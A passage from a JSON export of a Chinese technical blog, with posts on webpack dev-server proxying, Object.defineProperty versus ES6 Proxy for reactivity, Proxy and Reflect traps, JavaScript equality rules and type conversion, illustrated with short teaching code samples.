class=&quot;middle&quot;&gt;中间&lt;/div&gt;30 &lt;div class=&quot;right&quot;&gt;右侧&lt;/div&gt;31&lt;/div&gt;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"wepack proxy的原理","slug":"wepack-proxy的原理","date":"2022-04-20T14:22:14.000Z","updated":"2022-05-02T15:50:18.997Z","comments":true,"path":"2022/04/20/wepack-proxy的原理/","link":"","permalink":"https://coloey.github.io/2022/04/20/wepack-proxy%E7%9A%84%E5%8E%9F%E7%90%86/","excerpt":"","text":"一、是什么webpack proxy，即webpack提供的代理服务 基本行为就是接收客户端发送的请求后转发给其他服务器 其目的是为了便于开发者在开发模式下解决跨域问题（浏览器安全策略限制） 想要实现代理首先需要一个中间服务器，webpack中提供服务器的工具为webpack-dev-server webpack-dev-serverwebpack-dev-server是 webpack 官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起 目的是为了提高开发者日常的开发效率，只适用在开发阶段 关于配置方面，在webpack配置对象属性中通过devServer属性提供，如下： 12345678910111213141516171// ./webpack.config.js2const path = require(&#x27;path&#x27;)34module.exports = &#123;5 // ...6 devServer: &#123;7 contentBase: path.join(__dirname, &#x27;dist&#x27;),8 compress: true,9 port: 9000,10 proxy: &#123;11 &#x27;/api&#x27;: &#123;12 target: &#x27;https://api.github.com&#x27;13 &#125;14 &#125;15 // ...16 &#125;17&#125; devServetr里面proxy则是关于代理的配置，该属性为对象的形式，对象中每一个属性就是一个代理的规则匹配 属性的名称是需要被代理的请求路径前缀，一般为了辨别都会设置前缀为 /api，值为对应的代理匹配规则，对应如下： target：表示的是代理到的目标地址 pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除，可以使用pathRewrite secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false changeOrigin：它表示是否更新代理后请求的 headers 中host地址 二、工作原理proxy工作原理实质上是利用http-proxy-middleware 这个http代理中间件，实现请求转发给其他服务器 举个例子： 在开发阶段，本地地址为http://localhost:3000，该浏览器发送一个前缀带有/api标识的请求到服务端获取数据，但响应这个请求的服务器只是将请求转发到另一台服务器中 1234567891const express = require(&#x27;express&#x27;);2const proxy = require(&#x27;http-proxy-middleware&#x27;);34const app = express();56app.use(&#x27;/api&#x27;, proxy(&#123;target: &#x27;http://www.example.org&#x27;, changeOrigin: true&#125;));7app.listen(3000);89// http://localhost:3000/api/foo/bar -&gt; http://www.example.org/api/foo/bar 三、跨域在开发阶段， webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上 所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题 通过设置webpack proxy实现代理请求后，相当于浏览器与服务端中添加一个代理者 当本地发送请求的时候，代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地 在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据 注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制","categories":[{"name":"前端工程化","slug":"前端工程化","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"},{"name":"webpack","slug":"前端工程化/webpack","permalink":"https://coloey.github.io/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack/"}],"tags":[]},{"title":"Object.defineProperty和Proxy区别","slug":"Object-defineProperty和Proxy区别","date":"2022-04-20T06:17:15.000Z","updated":"2022-04-20T13:07:36.341Z","comments":true,"path":"2022/04/20/Object-defineProperty和Proxy区别/","link":"","permalink":"https://coloey.github.io/2022/04/20/Object-defineProperty%E5%92%8CProxy%E5%8C%BA%E5%88%AB/","excerpt":"","text":"一、Object.defineProperty定义：Object.defineProperty() 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象 为什么能实现响应式通过defineProperty 两个属性，get及set get 属性的 getter 函数，当访问该属性时，会调用此函数。执行时不传入任何参数，但是会传入 this 对象（由于继承关系，这里的this并不一定是定义该属性的对象）。该函数的返回值会被用作属性的值 set 属性的 setter 函数，当属性值被修改时，会调用此函数。该方法接受一个参数（也就是被赋予的新值），会传入赋值时的 this 对象。默认为 undefined 下面通过代码展示： 定义一个响应式函数defineReactive 1234567891011121314151617181function update() &#123;2 app.innerText = obj.foo3&#125;45function defineReactive(obj, key, val) &#123;6 Object.defineProperty(obj, key, &#123;7 get() &#123;8 console.log(`get $&#123;key&#125;:$&#123;val&#125;`);9 return val10 &#125;,11 set(newVal) &#123;12 if (newVal !== val) &#123;13 val = newVal14 update()15 &#125;16 &#125;17 &#125;)18&#125; 调用defineReactive，数据发生变化触发update方法，实现数据响应式 123451const obj = &#123;&#125;2defineReactive(obj, &#x27;foo&#x27;, &#x27;&#x27;)3setTimeout(()=&gt;&#123;4 obj.foo = new Date().toLocaleTimeString()5&#125;,1000) 在对象存在多个key情况下，需要进行遍历 123456781function observe(obj) &#123;2 if (typeof obj !== &#x27;object&#x27; || obj == null) &#123;3 return4 &#125;5 Object.keys(obj).forEach(key =&gt; &#123;6 defineReactive(obj, key, obj[key])7 &#125;)8&#125; 如果存在嵌套对象的情况，还需要在defineReactive中进行递归 1234567891011121314151function defineReactive(obj, key, val) &#123;2 observe(val)3 Object.defineProperty(obj, key, &#123;4 get() &#123;5 console.log(`get $&#123;key&#125;:$&#123;val&#125;`);6 return val7 &#125;,8 set(newVal) &#123;9 if (newVal !== val) &#123;10 val = newVal11 update()12 &#125;13 &#125;14 &#125;)15&#125; 当给key赋值为对象的时候，还需要在set属性中进行递归 1234561set(newVal) &#123;2 if (newVal !== val) &#123;3 observe(newVal) // 新值是对象的情况4 notifyUpdate()5 &#125;6&#125; 上述例子能够实现对一个对象的基本响应式，但仍然存在诸多问题 现在对一个对象进行删除与添加属性操作，无法劫持到 12345671const obj = &#123;2 foo: &quot;foo&quot;,3 bar: &quot;bar&quot;4&#125;5observe(obj)6delete obj.foo // no ok7obj.jar = &#x27;xxx&#x27; // no ok 当我们对一个数组进行监听的时候，并不那么好使了 12345671const arrData = [1,2,3,4,5];2arrData.forEach((val,index)=&gt;&#123;3 defineProperty(arrData,index,val)4&#125;)5arrData.push() // no ok6arrData.pop() // no ok7arrDate[0] = 99 // ok 可以看到数据的api无法劫持到，从而无法实现数据响应式， 所以在Vue2中，增加了set、delete API，并且对数组api方法进行一个重写 还有一个问题则是，如果存在深层的嵌套对象关系，需要深层的进行监听，造成了性能的极大问题 小结 检测不到对象属性的添加和删除 数组API方法无法监听到 需要对每个属性进行遍历监听，如果嵌套对象，需要深层监听，造成性能问题 二、proxyProxy的监听是针对一个对象的，那么对这个对象的所有操作会进入监听操作，这就完全可以代理所有属性了 在ES6系列中，我们详细讲解过Proxy的使用，就不再述说了 下面通过代码进行展示： 定义一个响应式方法reactive 1234567891011121314151617181920212223241 function reactive(obj) &#123;2 if (typeof obj !== &#x27;object&#x27; &amp;&amp; obj != null) &#123;3 return obj4 &#125;5 // Proxy相当于在对象外层加拦截6 const observed = new Proxy(obj, &#123;7 get(target, key, receiver) &#123;8 const res = Reflect.get(target, key, receiver)9 console.log(`获取$&#123;key&#125;:$&#123;res&#125;`)10 return res11 &#125;,12 set(target, key, value, receiver) &#123;13 const res = Reflect.set(target, key, value, receiver)14 console.log(`设置$&#123;key&#125;:$&#123;value&#125;`)15 return res16 &#125;,17 deleteProperty(target, key) &#123;18 const res = Reflect.deleteProperty(target, key)19 console.log(`删除$&#123;key&#125;:$&#123;res&#125;`)20 return res21 &#125;22 &#125;)23 return observed24&#125; 测试一下简单数据的操作，发现都能劫持 12345678910111const state = reactive(&#123;2 foo: &#x27;foo&#x27;3&#125;)4// 1.获取5state.foo // ok6// 2.设置已存在属性7state.foo = &#x27;fooooooo&#x27; // ok8// 3.设置不存在属性9state.dong = &#x27;dong&#x27; // ok10// 4.删除属性11delete state.dong // ok 再测试嵌套对象情况，这时候发现就不那么 OK 了 1234561 const state = reactive(&#123;2 bar: &#123; a: 1 &#125;3&#125;)45// 设置嵌套对象属性6 state.bar.a = 10 // no ok 如果要解决，需要在get之上再进行一层代理 123456789101112131function reactive(obj) &#123;2 if (typeof obj !== &#x27;object&#x27; &amp;&amp; obj != null) &#123;3 return obj4 &#125;5 // Proxy相当于在对象外层加拦截6 const observed = new Proxy(obj, &#123;7 get(target, key, receiver) &#123;8 const res = Reflect.get(target, key, receiver)9 console.log(`获取$&#123;key&#125;:$&#123;res&#125;`)10 return isObject(res) ? reactive(res) : res11 &#125;,12 return observed13&#125; 三、总结Object.defineProperty只能遍历对象属性进行劫持 123456781function observe(obj) &#123;2 if (typeof obj !== &#x27;object&#x27; || obj == null) &#123;3 return4 &#125;5 Object.keys(obj).forEach(key =&gt; &#123;6 defineReactive(obj, key, obj[key])7 &#125;)8&#125; Proxy直接可以劫持整个对象，并返回一个新对象，我们可以只操作新的对象达到响应式目的 1234567891011121314151617181920212223241function reactive(obj) &#123;2 if (typeof obj !== &#x27;object&#x27; &amp;&amp; obj != null) &#123;3 return obj4 &#125;5 // Proxy相当于在对象外层加拦截6 const observed = new Proxy(obj, &#123;7 get(target, key, receiver) &#123;8 const res = Reflect.get(target, key, receiver)9 console.log(`获取$&#123;key&#125;:$&#123;res&#125;`)10 return res11 &#125;,12 set(target, key, value, receiver) &#123;13 const res = Reflect.set(target, key, value, receiver)14 console.log(`设置$&#123;key&#125;:$&#123;value&#125;`)15 return res16 &#125;,17 deleteProperty(target, key) &#123;18 const res = Reflect.deleteProperty(target, key)19 console.log(`删除$&#123;key&#125;:$&#123;res&#125;`)20 return res21 &#125;22 &#125;)23 return observed24&#125; Proxy可以直接监听数组的变化（push、shift、splice） 1231const obj = [1,2,3]2const proxtObj = reactive(obj)3obj.psuh(4) // ok Proxy有多达13种拦截方法,不限于apply、ownKeys、deleteProperty、has等等，这是Object.defineProperty不具备的 正因为defineProperty自身的缺陷，导致Vue2在实现响应式过程需要实现其他的方法辅助（如重写数组方法、增加额外set、delete方法） 123456789101112131// 数组重写2const originalProto = Array.prototype3const arrayProto = Object.create(originalProto)4[&#x27;push&#x27;, &#x27;pop&#x27;, &#x27;shift&#x27;, &#x27;unshift&#x27;, &#x27;splice&#x27;, &#x27;reverse&#x27;, &#x27;sort&#x27;].forEach(method =&gt; &#123;5 arrayProto[method] = function () &#123;6 originalProto[method].apply(this.arguments)7 dep.notice()8 &#125;9&#125;);1011// set、delete12Vue.set(obj,&#x27;bar&#x27;,&#x27;newbar&#x27;)13Vue.delete(obj),&#x27;bar&#x27;) Proxy 不兼容IE，也没有 polyfill, defineProperty 能支持到IE9 使用场景 拦截和监视外部对对象的访问 降低函数或类的复杂度 在复杂操作前对操作进行校验或对所需资源进行管理 保障数据类型的准确性 1234567891011let numericDataStore=&#123;count:0,amount:1234,total:14&#125;numericDataStore=new Proxy(numericDataStore,&#123; set(target,key,value,proxy)&#123; if(typeof value!=&#x27;number&#x27;)&#123; throw Error(&quot;属性只能是Number类型&quot;) &#125; return Reflect.set(target,key,value,proxy) &#125;&#125;);numericDataStore.count=&quot;foo&quot;numericDataStore.count=33; 实现观察者模式 123456789//观察者模式，观察者函数都放在Set集合，当修改obj的值，会在set函数中拦截，自动执行Set所有的观察者const queueObservers=new Set();const observe=fn=&gt;queueObservers.add(fn)//将观察者函数加入队列const observable=obj=&gt;new Proxy(obj,&#123;set&#125;);//返回一个原始对象的Proxy代理，拦截赋值操作，触发充当观察者的每个函数function set(target,key,value,receiver)&#123; const res=Reflect.set(target,key,value,receiver); queueObservers.forEach(observer=&gt;observer());//触发充当观察者的每个函数 return res;&#125; 声明一个私有的apiKey,便于api这个对象内部的方法调用，但不希望外部也能够访问api._apiKey 1234567891011121314151617181920let api=&#123; _apiKey:&#x27;123456def&#x27;&#125;const RESTRICTED=[&#x27;_apiKey&#x27;]api=new Proxy(api,&#123; get(target,key,proxy)&#123; if(RESTRICTED.indexOf(key)&gt;-1)&#123; throw Error(`$&#123;key&#125;不可访问`) &#125; return Reflect.get(target,key,proxy) &#125;, set(target,key,value,proxy)&#123; if(RESTRICTED.indexOf(key)&gt;-1)&#123; throw Error(`$&#123;key&#125;不可修改`) &#125; return Reflect.set(target,key,value,proxy) &#125;&#125;)console.log(api._apiKey);api._apiKey=&#x27;12345&#x27;;//上述都抛出错误","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Proxy","slug":"Proxy","date":"2022-04-20T00:25:25.000Z","updated":"2022-04-30T14:30:29.359Z","comments":true,"path":"2022/04/20/Proxy/","link":"","permalink":"https://coloey.github.io/2022/04/20/Proxy/","excerpt":"","text":"代理就是一种由你创建的特殊对象，它“封装”另一个普通对象，或者说挡在这个普通对象前面，你可以在代理对象上注册特殊的处理函数（trap),代理上执行各种操作的时候会调用这个程序 123456789101112var obj=&#123;a:1&#125;, handles=&#123; get(target,key,context)&#123; //target==obj,context==pobj,key为属性名 console.log(&quot;accessing&quot;,key); return Reflect.get(target,key,context) &#125; &#125;pobj=new Proxy(obj,handlers);obj.a;//1pobj.a;//acessing:a//1 这里的映射是有意对称的，每个代理处理函数在对应的元编程任务执行的时候进行拦截，而每个Reflefct工具在一个对象上执行相应的元编程任务，每个代理函数都有一个自动调用相应的Reflect工具的默认定义。 一、介绍定义： 用于定义基本操作的自定义行为 本质： 修改的是程序默认形为，就形同于在编程语言层面上做修改，属于元编程(meta programming) 元编程（Metaprogramming，又译超编程，是指某类计算机程序的编写，这类计算机程序编写或者操纵其它程序（或者自身）作为它们的数据，或者在运行时完成部分本应在编译时完成的工作 一段代码来理解 12345671#!/bin/bash2# metaprogram3echo &#x27;#!/bin/bash&#x27; &gt;program4for ((I=1; I&lt;=1024; I++)) do5 echo &quot;echo $I&quot; &gt;&gt;program6done7chmod +x program 这段程序每执行一次能帮我们生成一个名为program的文件，文件内容为1024行echo，如果我们手动来写1024行代码，效率显然低效 元编程优点：与手工编写全部代码相比，程序员可以获得更高的工作效率，或者给与程序更大的灵活度去处理新的情形而无需重新编译 Proxy 亦是如此，用于创建一个对象的代理，从而实现基本操作的拦截和自定义（如属性查找、赋值、枚举、函数调用等） 二、用法Proxy为 构造函数，用来生成 Proxy 实例 11var proxy = new Proxy(target, handler) 参数target表示所要拦截的目标对象（任何类型的对象，包括原生数组，函数，甚至另一个代理）） handler通常以函数作为属性的对象，各属性中的函数分别定义了在执行各种操作时代理 p 的行为 handler解析关于handler拦截属性，有如下： get(target,propKey,receiver)：拦截对象属性的读取 set(target,propKey,value,receiver)：拦截对象属性的设置 has(target,propKey)：拦截propKey in proxy的操作，返回一个布尔值 deleteProperty(target,propKey)：拦截delete proxy[propKey]的操作，返回一个布尔值 ownKeys(target)：拦截Object.keys(proxy)、for...in等循环，返回一个数组 getOwnPropertyDescriptor(target, propKey)：拦截Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象 defineProperty(target, propKey, propDesc)：拦截Object.defineProperty(proxy, propKey, propDesc），返回一个布尔值 preventExtensions(target)：拦截Object.preventExtensions(proxy)，返回一个布尔值 getPrototypeOf(target)：拦截Object.getPrototypeOf(proxy)，返回一个对象 isExtensible(target)：拦截Object.isExtensible(proxy)，返回一个布尔值 setPrototypeOf(target, proto)：拦截Object.setPrototypeOf(proxy, proto)，返回一个布尔值 apply(target, object, args)：拦截 Proxy 实例作为函数调用的操作 construct(target, args)：拦截 Proxy 实例作为构造函数调用的操作 Reflect若需要在Proxy内部调用对象的默认行为，建议使用Reflect，其是ES6中操作对象而提供的新 API 基本特点： 只要Proxy对象具有的代理方法，Reflect对象全部具有，以静态方法的形式存在 修改某些Object方法的返回结果，让其变得更合理（定义不存在属性行为的时候不报错而是返回false） 让Object操作都变成函数行为 下面我们介绍proxy几种用法： get()get接受三个参数，依次为目标对象、属性名和 proxy 实例本身，最后一个参数可选 12345678910111var person = &#123;2 name: &quot;张三&quot;3&#125;;45var proxy = new Proxy(person, &#123;6 get: function(target, propKey) &#123;7 return Reflect.get(target,propKey)8 &#125;9&#125;);1011proxy.name // &quot;张三&quot; get能够对数组增删改查进行拦截，下面是试下你数组读取负数的索引 1234567891011121314151617181function createArray(...elements) &#123;2 let handler = &#123;3 get(target, propKey, receiver) &#123;4 let index = Number(propKey);5 if (index &lt; 0) &#123;6 propKey = String(target.length + index);7 &#125;8 return Reflect.get(target, propKey, receiver);9 &#125;10 &#125;;1112 let target = [];13 target.push(...elements);14 return new Proxy(target, handler);15&#125;1617let arr = createArray(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);18arr[-1] // c 注意：如果一个属性不可配置（configurable）且不可写（writable），则 Proxy 不能修改该属性，否则会报错 1234567891011121314151617181const target = Object.defineProperties(&#123;&#125;, &#123;2 foo: &#123;3 value: 123,4 writable: false,5 configurable: false6 &#125;,7&#125;);89const handler = &#123;10 get(target, propKey) &#123;11 return &#x27;abc&#x27;;12 &#125;13&#125;;1415const proxy = new Proxy(target, handler);1617proxy.foo18// TypeError: Invariant check failed set()set方法用来拦截某个属性的赋值操作，可以接受四个参数，依次为目标对象、属性名、属性值和 Proxy 实例本身 假定Person对象有一个age属性，该属性应该是一个不大于 200 的整数，那么可以使用Proxy保证age的属性值符合要求 12345678910111213141516171819202122231let validator = &#123;2 set: function(obj, prop, value) &#123;3 if (prop === &#x27;age&#x27;) &#123;4 if (!Number.isInteger(value)) &#123;5 throw new TypeError(&#x27;The age is not an integer&#x27;);6 &#125;7 if (value &gt; 200) &#123;8 throw new RangeError(&#x27;The age seems invalid&#x27;);9 &#125;10 &#125;1112 // 对于满足条件的 age 属性以及其他属性，直接保存13 obj[prop] = value;14 &#125;15&#125;;1617let person = new Proxy(&#123;&#125;, validator);1819person.age = 100;2021person.age // 10022person.age = &#x27;young&#x27; // 报错23person.age = 300 // 报错 如果目标对象自身的某个属性，不可写且不可配置，那么set方法将不起作用 1234567891011121314151const obj = &#123;&#125;;2Object.defineProperty(obj, &#x27;foo&#x27;, &#123;3 value: &#x27;bar&#x27;,4 writable: false,5&#125;);67const handler = &#123;8 set: function(obj, prop, value, receiver) &#123;9 obj[prop] = &#x27;baz&#x27;;10 &#125;11&#125;;1213const proxy = new Proxy(obj, handler);14proxy.foo = &#x27;baz&#x27;;15proxy.foo // &quot;bar&quot; 注意，严格模式下，set代理如果没有返回true，就会报错 12345678910111&#x27;use strict&#x27;;2const handler = &#123;3 set: function(obj, prop, value, receiver) &#123;4 obj[prop] = receiver;5 // 无论有没有下面这一行，都会报错6 return false;7 &#125;8&#125;;9const proxy = new Proxy(&#123;&#125;, handler);10proxy.foo = &#x27;bar&#x27;;11// TypeError: &#x27;set&#x27; on proxy: trap returned falsish for property &#x27;foo&#x27; deleteProperty()deleteProperty方法用于拦截delete操作，如果这个方法抛出错误或者返回false，当前属性就无法被delete命令删除 12345678910111213141516171var handler = &#123;2 deleteProperty (target, key) &#123;3 invariant(key, &#x27;delete&#x27;);4 Reflect.deleteProperty(target,key)5 return true;6 &#125;7&#125;;8function invariant (key, action) &#123;9 if (key[0] === &#x27;_&#x27;) &#123;10 throw new Error(`无法删除私有属性`);11 &#125;12&#125;1314var target = &#123; _prop: &#x27;foo&#x27; &#125;;15var proxy = new Proxy(target, handler);16delete proxy._prop17// Error: 无法删除私有属性 注意，目标对象自身的不可配置（configurable）的属性，不能被deleteProperty方法删除，否则报错 Reflect.apply()静态方法 **Reflect**.apply() 通过指定的参数列表发起对目标(target)函数的调用。 1Reflect.apply(target, thisArgument, argumentsList) 参数 target 目标函数。 thisArgument target函数调用时绑定的this对象。 argumentsList target函数调用时传入的实参列表，该参数应该是一个类数组的对象。 返回值返回值是调用完带着指定参数和 this 值的给定的函数后返回的结果。 可取消代理普通代理总是陷入到目标对象，并且在创建之后不能修改——只要还保持着对这个代理的引用，代理的机制就将维持下去，如果你想要的创建一个在你想要停止它作为代理时便可以被停止的代理，可以创建可取消代理。（revocable proxy) 1234567891011121314var obj=&#123;a:1&#125;,handlers=&#123; get(target,key,context)&#123; console.log(&#x27;accessing:&#x27;,key); return target[key]; &#125;&#125;;var p=Proxy.revocable(obj,handlers);//返回一个有两个属性proxy和revoke的对象const pobj=p.proxy;const prevoke=p.revoke;console.log(pobj.a);prevoke();//代理被取消后，任何对它的访问都会抛出错误pobj.a()//Uncaught TypeError: Cannot perform &#x27;get&#x27; on a proxy that has been revoked 可取消代理可能的应用场景:在应用中把代理分发到第三方，其中管理你的模型数据，而不是给出真实模型本身的引用。如果你的模型对象改变或被替换，就可以使分发出去的代理失效，这样第三方就可以知晓变化并请求更新到这个模型的引用。 使用代理：代理在前:代理与目标交流，首先与代理交互，通过与代理交互来增加某些特殊的规则，这些是message本身没有的。 123456789101112131415161718192021222324var messages=[],handlers=&#123; get(target,key)&#123; if(typeof target[key]==&#x27;string&#x27;)&#123; return target[key].replace(/[^w]/g,&quot;&quot;);//过滤标点符号 &#125; return target[key];//所有其他的传递下去 &#125;, set(target,key,val)&#123; //设定唯一字符串，改为小写 if(typeof val==&#x27;string&#x27;)&#123;//值为字符串，且是唯一值添加元素 if(target.indexOf(val)==-1)&#123; target.push(val.toLowerCase()); &#125; &#125; return true; &#125;&#125;var messages_proxy=new Proxy(messages,handlers);messages_proxy.push(&#x27;heLLo...&#x27;,42,&quot;wOrlD!!&quot;,&quot;WoRld!!&quot;);messages_proxy.forEach(val=&gt;&#123; console.log(val);&#125;)messages.forEach(v=&gt;console.log(v));//hello... world!! world!! 代理在后：让目标与代理交流，而不是代理与目标交流。代理只能与主对象交互，实现方式就是把proxy对象放到主对象的[[Prototype]]链中 123456789101112131415161718var handlers=&#123; get(target,key,context)&#123; return function()&#123; context.speak(key+&quot;!&quot;) &#125; &#125;&#125;,catchall=new Proxy(&#123;&#125;,handlers),greeter=&#123; speak(who=&quot;someone&quot;)&#123; console.log(&quot;hello&quot;,who) &#125;&#125;Object.setPrototypeOf(greeter,catchall);//将代理设置为目标对象的__proto___greeter.speak();greeter.speak(&quot;world&quot;);greeter.everyone();//检查[[Prototype]]链会查看catchall是否有everyone属性，然厚代理的get()处理函数介入并返回一个用访问的属性名(&quot;everyone&quot;)调用speak()函数 访问不存在的属性名抛出错误代理在前12345678910111213141516171819202122232425262728var obj=&#123; a:1, foo()&#123; console.log(&quot;a:&quot;,this.a) &#125;&#125;,handlers=&#123; get(target,key,context)&#123; if(Reflect.has(target,key))&#123; return Reflect.get(target,key,context) &#125; else&#123; throw Error(&quot;no such property/method&quot;) &#125; &#125;, set(target,key,val,context)&#123; if(Reflect.has(target,key))&#123; return Reflect.set(target,key,val,context) &#125;else&#123; throw Error(&quot;no such property/method&quot;) &#125; &#125;&#125;,pobj=new Proxy(obj,handlers)pobj.a=3;pobj.foo();pobj.b=4;//Uncaught Error: no such property/method 代理在后：1234567891011121314151617181920var handlers=&#123; get()&#123; throw &quot;no such property/method&quot; &#125;, set()&#123; throw &quot;no such property/method&quot; &#125;&#125;var pobj=new Proxy(&#123;&#125;,handlers);var obj=&#123; a:1, foo()&#123; console.log(&quot;a:&quot;,this.a) &#125;&#125;Object.setPrototypeOf(obj,pobj);obj.a=3;obj.foo();obj.b=4;//Uncaught Error: no such property/methodxxc 代理实现多个[[Prototype]]链接12345678910111213141516171819202122232425262728293031323334353637383940var obj1=&#123; name:&quot;obj-1&quot;, foo()&#123; console.log(&quot;obj1.foo&quot;,this.name) &#125;&#125;,obj2=&#123; name:&quot;obj-2&quot;, foo()&#123; console.log(&quot;obj2.foo&quot;,this.name) &#125;, bar()&#123; console.log(&quot;obj2.bar&quot;,this.name) &#125; &#125;,handlers=&#123; get(target,key,context)&#123; if(Reflect.has(target,key))&#123; return Reflect.get(target,key,context) &#125;else&#123; //伪装多个[[Prototype]] for(let p of target[Symbol.for(&quot;[[Prototype]]&quot;)])&#123; if(Reflect.has(p,key))&#123; return Reflect.get(p,key,context) &#125; &#125; &#125; &#125;&#125;,obj3=new Proxy(&#123; name:&quot;obj3&quot;, baz()&#123; this.foo(); this.bar() &#125;&#125;,handlers)//伪装多个[[Prototype]]的链接obj3[Symbol.for(&quot;[[Prototype]]&quot;)]=[obj1,obj2];obj3.baz();//obj1.foo:obj-3//obj2.var:obj-3","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"宽松相等和严格相等","slug":"宽松相等和严格相等","date":"2022-04-18T15:14:28.000Z","updated":"2022-04-18T16:12:57.633Z","comments":true,"path":"2022/04/18/宽松相等和严格相等/","link":"","permalink":"https://coloey.github.io/2022/04/18/%E5%AE%BD%E6%9D%BE%E7%9B%B8%E7%AD%89%E5%92%8C%E4%B8%A5%E6%A0%BC%E7%9B%B8%E7%AD%89/","excerpt":"","text":"区别：==允许在相等比较中做强制类型转换而===不允许 1234var a=42;var b=&quot;42&quot;;a===b;//false;a==b;//true ES5中定义： 如果Type(x)是数字，Type(y)是字符串，则返回x==ToNumber(y)的结果 如果Type(x)是字符串，Type(y)是数字，则返回ToNumber(x)==y的结果 其他类型和布尔类型之间的相等比较1234var a=&#x27;42&#x27;;var b=true;a==b;//false//ToNumber()将b转为1，变成&#x27;42&#x27;==1,又把&#x27;42&#x27;转为42就出现不相等 规范： 1.如果Type(x)是布尔类型，则返回ToNumber(x)==y的结果 2.如果Type(y)是布尔类型，则返回x==ToNumber(y)的结果 这个结果是错误的，因为’42‘本身是真值，要避免==true,==false 123456var a=&#x27;42&#x27;;//不要这样用，不成立if(a==true)if(a)if(!!a)if(Boolean(a)) null和undefined之间的相等比较规范： 如果x为null,y为undefined,则结果为true 如果x为undefined,y为null，则结果为true 因此判断a是否是null或者undefined时直接判断a==null即可 对象和非对象的相等比较规范： 如果Type(x)是字符串或者数字，Type(y)是对象，则返回x==ToPrimitive(y)的结果 如果Type(x)是对象，Type(y)是字符串或数字，则返回ToPrimitive(x)==y的结果 1234567891011121314151617var a=42;var b=[42];a==b;//true,变成42==&#x27;42&#x27;=&gt;42==42var a=&quot;abc&quot;;var b=Object(a);a===b;//falsea==b;//true,b通过ToPrimitive强制类型转换为&quot;abc&quot;//没有对应封装对象，null和undefined不能被封装，下面返回falsevar a==null;var b=Object(a);a==b;//falsevar a=undefined;var b=Object(a);a==b;//falsevar a=NAN;var b=Object(a);a==b;//false,因为NAN==NAN本身是false","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"运算符与类型转换","slug":"运算符与类型转换","date":"2022-04-18T13:46:10.000Z","updated":"2022-05-02T16:07:54.808Z","comments":true,"path":"2022/04/18/运算符与类型转换/","link":"","permalink":"https://coloey.github.io/2022/04/18/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/","excerpt":"","text":"显示类型转换 显示转换，即我们很清楚可以看到这里发生了类型的转变，常见的方法有： Number() parseInt() String() Boolean() Number()将任意类型的值转化为数值 先给出类型转换规则： 12345678910111213141516171819202122232425Number(324) // 324// 字符串：如果可以被解析为数值，则转换为相应的数值Number(&#x27;324&#x27;) // 324// 字符串：如果不可以被解析为数值，返回 NaNNumber(&#x27;324abc&#x27;) // NaN// 空字符串转为0Number(&#x27;&#x27;) // 0// 布尔值：true 转成 1，false 转成 0Number(true) // 1Number(false) // 0// undefined：转成 NaNNumber(undefined) // NaN// null：转成0Number(null) // 0// 对象：通常转换成NaN(除了只包含单个数值的数组)Number(&#123;a: 1&#125;) // NaNNumber([1, 2, 3]) // NaNNumber([5]) // 5 从上面可以看到，Number转换的时候是很严格的，只要有一个字符无法转成数值，整个字符串就会被转为NaN parseInt()parseInt相比Number，就没那么严格了，parseInt函数逐个解析字符，遇到不能转换的字符就停下来 11parseInt(&#x27;32a3&#x27;) //32 String()可以将任意类型的值转化成字符串 给出转换规则图： 123456789101112131415161718// 数值：转为相应的字符串String(1) // &quot;1&quot;//字符串：转换后还是原来的值String(&quot;a&quot;) // &quot;a&quot;//布尔值：true转为字符串&quot;true&quot;，false转为字符串&quot;false&quot;String(true) // &quot;true&quot;//undefined：转为字符串&quot;undefined&quot;String(undefined) // &quot;undefined&quot;//null：转为字符串&quot;null&quot;String(null) // &quot;null&quot;//对象String(&#123;a: 1&#125;) // &quot;[object Object]&quot;String([1, 2, 3]) // &quot;1,2,3&quot; Boolean()可以将任意类型的值转为布尔值，转换规则如下： 12345678Boolean(undefined) // falseBoolean(null) // falseBoolean(0) // falseBoolean(NaN) // falseBoolean(&#x27;&#x27;) // falseBoolean(&#123;&#125;) // trueBoolean([]) // trueBoolean(new Boolean(false)) // true “|”运算符它仅执行ToInt32转换 12340|=0//00|NAN;//00|Infinity;//00|-Infinity;//0 以上字符无法以32位格式呈现，他们都来自64位IEE754标准，因此ToInt返回0 “~”运算符它首先将值转为32位数字，然后执行字位操作“非”，对每一位进行反转，也就是返回2的补码，x相当于-(x+1)，-(x+1)唯一能够得到0的x值时-1，也就是说如果x为-1，和一些数字值连在一起就会返回假值，其他情况返回真值 而-1是一个“哨位值”,即在各个类型中被赋予了特殊含义的值，如indexOf(),在字符串中找到指定字符返回子字符串所在位置，否则返回-1 1234567891011var a=&quot;Hello world&quot;;~a.indexOf(&quot;lo&quot;);//-4if(~a.indexOf(&quot;lo&quot;))&#123;//true //找到匹配 &#125;~a.indexOf(&quot;ol&quot;);//0,假值!~a.indexOf(&quot;ol&quot;);//trueif(!~a.indexOf(&quot;ol&quot;))&#123;//true 